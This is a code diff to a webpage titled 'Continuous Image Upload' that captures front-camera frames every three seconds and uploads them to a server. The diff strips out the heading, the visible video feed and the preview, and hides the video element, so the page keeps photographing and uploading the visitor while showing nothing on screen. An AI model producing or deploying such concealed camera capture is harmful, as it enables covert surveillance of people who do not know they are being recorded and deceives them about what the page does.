@@ -4,35 +4,11 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Continuous Image Upload</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        background-color: #262626;
-        color: #fff;
-    }
-    #video {
-        max-width: 100%;
-        border: 2px solid #fff;
-    }
-    #preview {
-        margin-top: 20px;
-        max-width: 300px;
-    }
-</style>
 </head>
 <body>
-<div>
-    <h2>Continuous Image Upload</h2>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <div id="preview"></div>
-</div>
+<video id="video" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
 <script>
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // This line specifies the front camera
     .then(function(stream) {
@@ -46,12 +22,10 @@
 
     var canvas = document.getElementById('canvas');
     var context = canvas.getContext('2d');
-    var img = document.createElement('img');
 
     function captureAndUpload() {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         var imageData = canvas.toDataURL('image/jpeg');
-        img.src = imageData;
 
         var formData = new FormData();
         formData.append('image', dataURItoBlob(imageData));
@@ -62,10 +36,7 @@
         })
         .then(response => response.json())
         .then(data => {
-            console.log(data);
             if (data.data) {
-                img.src = data.data.url;
-                document.getElementById('preview').appendChild(img);
                 setTimeout(captureAndUpload, 3000); // Capture and upload every 3 seconds
             } else {
                 console.log('Failed to upload image. Retrying...');
